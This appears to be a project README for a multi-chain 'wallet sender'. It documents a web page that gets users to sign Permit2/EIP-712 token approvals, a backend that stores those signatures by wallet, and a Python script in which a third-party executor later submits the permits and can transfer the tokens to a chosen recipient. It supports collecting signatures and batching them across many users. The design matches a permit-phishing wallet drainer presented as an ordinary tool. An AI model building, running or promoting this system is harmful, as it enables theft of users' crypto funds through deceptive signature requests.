# Permit2 Multi-Chain Wallet Sender

A complete system for collecting EIP-712 permit signatures from users and executing them on blockchain using Permit2. This implementation solves the nonce mismatch issue by fetching the actual nonce from the token contract.

## System Overview

The wallet sender consists of three components:

1. **Frontend** (`src/client/permit.html` + `src/client/wallet-sender.js`)
   - Beautiful UI for connecting wallets and creating signatures
   - Fetches the actual nonce from the token contract (fixes the mismatch issue)
   - Supports multiple blockchains (Ethereum, Polygon, Avalanche, BSC)
   - Stores signatures locally and submits to backend

2. **Backend** (`src/server/routes/permit-routes.js` + `src/server/permit-handler.js`)
   - REST API endpoints for submitting, validating, and retrieving permits
   - Stores signatures in JSON files with wallet and chain info
   - Validates signatures before accepting them

3. **Python Sender** (`scripts/sender.py`)
   - Executes permit transactions on-chain
   - Verifies nonce matches before execution
   - Supports permit-only or permit + transfer operations
   - Clear error reporting for debugging

## Key Features

✅ **Fixes Nonce Mismatch**
- Fetches current nonce from token contract before signing
- Verifies nonce matches on execution
- Provides clear error messages when nonces don't match

✅ **Multi-Chain Support**
- Ethereum Mainnet
- Polygon
- Avalanche
- BSC
- Easy to add more chains

✅ **EIP-712 Compliant**
- Uses eth_signTypedData_v4 for signing
- Proper domain separation for each token
- Version 1 standard

✅ **Production Ready**
- Input validation
- Gas estimation
- Transaction receipt verification
- Comprehensive error handling

## Setup Instructions

### 1. Install Dependencies

```bash
# Backend dependencies are already in package.json
npm install

# Python dependencies
pip install web3>=6.0.0 eth-account>=0.9.0
```

### 2. Start the Backend Server

```bash
# From project root
npm start

# Or run directly
node src/server/server.js
```

The server will start on `http://localhost:3000` (configurable in `config.js`)

### 3. Access the Frontend

Open your browser and navigate to:
```
http://localhost:3000/permit
```

## Usage Guide

### For Users (Frontend)

1. **Connect Wallet**
   - Click "Connect Wallet" button
   - Approve MetaMask/wallet connection request
   - Your wallet address and chain will be displayed

2. **Select Blockchain**
   - Choose the blockchain where your token exists
   - Wallet will need to be connected to that chain

3. **Configure Permit**
   - **Token Address**: The ERC-20 token you want to approve
     - Default: UNI on Ethereum (0x1f9840a85d5af5bf1d1762f925bdaddc4201f984)
   - **Spender Address**: Who gets approval to spend tokens
     - Default: Permit2 (0x000000000022D473030F116dFC393fb8C563d921)
   - **Amount**: How many tokens (in Wei)
     - Default: 1 token (1e18)
   - **Deadline**: When signature expires (Unix timestamp)
     - Auto-set to 1 hour from now if left blank

4. **Create Permit Signature**
   - Click "Create Permit Signature"
   - Frontend automatically fetches current nonce from contract
   - Signs using EIP-712 (you'll be prompted in MetaMask)
   - Signature appears below

5. **Submit to Backend**
   - Click "Submit to Backend" to save signatures
   - Or "Download as JSON" to save locally

### For Developers (Backend)

**Submit Permits:**
```bash
curl -X POST http://localhost:3000/api/permits/submit \
  -H "Content-Type: application/json" \
  -d '{
    "permits": {
      "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": {
        "owner": "0x...",
        "spender": "0x...",
        "value": "1000000000000000000",
        "nonce": 0,
        "deadline": 1234567890,
        "v": 27,
        "r": "0x...",
        "s": "0x...",
        "signature": "0x...",
        "tokenAddress": "0x...",
        "chainId": 1
      }
    },
    "wallet": "0x...",
    "chainId": 1
  }'
```

**Get Permits:**
```bash
# Get all permits
curl http://localhost:3000/api/permits

# Get permits for specific wallet and chain
curl http://localhost:3000/api/permits/0x.../1
```

**Validate Permit:**
```bash
curl -X POST http://localhost:3000/api/permits/validate \
  -H "Content-Type: application/json" \
  -d '{"permit": {...}}'
```

### For Executors (Python Sender)

**Install Dependencies:**
```bash
pip install web3>=6.0.0 eth-account>=0.9.0
```

**Dry Run (Validate without executing):**
```bash
python scripts/sender.py \
  --rpc "https://eth-rpc.gateway.pokt.network" \
  --file "signatures/wallet-1-1234567890.json"
```

**Execute Permits:**
```bash
python scripts/sender.py \
  --rpc "https://eth-rpc.gateway.pokt.network" \
  --file "signatures/wallet-1-1234567890.json" \
  --key "your-private-key" \
  --execute
```

**Execute Permits + Transfer:**
```bash
python scripts/sender.py \
  --rpc "https://eth-rpc.gateway.pokt.network" \
  --file "signatures/wallet-1-1234567890.json" \
  --key "your-private-key" \
  --execute \
  --transfer-to "0xRecipientAddress"
```

## File Structure

```
Skilled_Stakes/
├── src/
│   ├── client/
│   │   ├── permit.html              # Frontend UI
│   │   └── wallet-sender.js         # Frontend logic
│   └── server/
│       ├── server.js                # Express server (updated with routes)
│       ├── permit-handler.js        # Signature storage logic
│       └── routes/
│           └── permit-routes.js     # API endpoints
├── scripts/
│   └── sender.py                    # Python executor
├── signatures/                      # Stored permits (auto-created)
├── permit-config.json              # Configuration
└── README_PERMITS.md               # This file
```

## API Reference

### POST /api/permits/submit
Submit permits from frontend.
- **Request body**: `{ permits, wallet, chainId }`
- **Response**: `{ success, message, fileName, permitCount }`

### GET /api/permits
Get all stored permits.
- **Response**: `{ success, count, permits[] }`

### GET /api/permits/:wallet/:chainId
Get permits for specific wallet and chain.
- **Params**: `wallet` (address), `chainId` (integer)
- **Response**: `{ success, wallet, chainId, count, permits[] }`

### POST /api/permits/validate
Validate a permit signature.
- **Request body**: `{ permit }`
- **Response**: `{ success, message, nonce, deadline, expires_in_seconds }`

### POST /api/permits/execute
Generate execution data for a permit.
- **Request body**: `{ permit }`
- **Response**: `{ success, message, executionData }`

## Troubleshooting

### Nonce Mismatch Error
**Problem**: Contract says nonce=0 but signature has nonce=882908
**Solution**: This is already fixed! The frontend now:
1. Fetches nonce from token contract
2. Uses that nonce in signature
3. Backend/Python verifies match before execution

**Debug**: Check browser console for "Fetched nonce for [token]"

### Signature Invalid Error
**Problem**: "ecrecover failed" or similar
**Solution**:
1. Ensure deadline hasn't passed
2. Verify token address is correct
3. Check you're on correct blockchain
4. Try creating new signature

### Transaction Reverted
**Problem**: "execution reverted"
**Solution**:
1. Check current nonce in contract (Python sender will show this)
2. Verify you have enough gas
3. Check spender address is correct
4. Ensure deadline hasn't passed

### Gas Estimation Failed
**Problem**: "Gas estimation failed"
**Solution**:
1. Verify token address is valid
2. Check if token supports permit (older tokens might not)
3. Try increasing gas limit manually
4. Check RPC endpoint is working

## Network Configuration

Edit `permit-config.json` to add more networks:

```json
{
  "networks": {
    "optimism": {
      "chainId": 10,
      "rpc": "https://mainnet.optimism.io",
      "permit2Address": "0x000000000022D473030F116dFC393fb8C563d921",
      "confirmations": 1
    }
  }
}
```

## Security Notes

⚠️ **Private Key Handling**
- Never share your private key
- The Python sender takes private keys as command-line arguments
- For production, use environment variables: `export PRIVATE_KEY=0x...`
- Then: `python sender.py ... --key $PRIVATE_KEY`

⚠️ **Deadline Validation**
- Always set reasonable deadlines
- Signatures can be used up until deadline expires
- Default is 1 hour from signing

⚠️ **Signature Verification**
- Frontend validates all signatures locally
- Backend validates before storing
- Python sender validates before executing

## Common Use Cases

### Case 1: Collect Signatures, Execute Later
1. Users sign permits through frontend
2. Backend stores signatures
3. Later, executor runs Python script to execute all

### Case 2: Instant Execution
1. User signs permit
2. Executor immediately runs Python script
3. Transaction executed on-chain

### Case 3: Multi-Sig Flow
1. Multiple users sign permits
2. Batch them in single JSON file
3. Execute all in sequence

## Advanced: Custom Token Support

Some tokens have non-standard permit implementations. To add support:

1. Check token's permit function signature
2. Modify ERC20_ABI in frontend/backend
3. Adjust encodePermitCall() in permit-handler.js
4. Test with small amount first

## Support & Debugging

**Enable Debug Logs:**
- Frontend: Open browser console (F12) - logs appear in Console tab
- Backend: Logs appear in terminal/console
- Python: Add `-v` flag for verbose output

**Check Signature Storage:**
```bash
ls signatures/
cat signatures/wallet-1-timestamp.json
```

## License

This code is part of Skilled_Stakes project.

## Questions?

Refer to the inline code comments for implementation details.
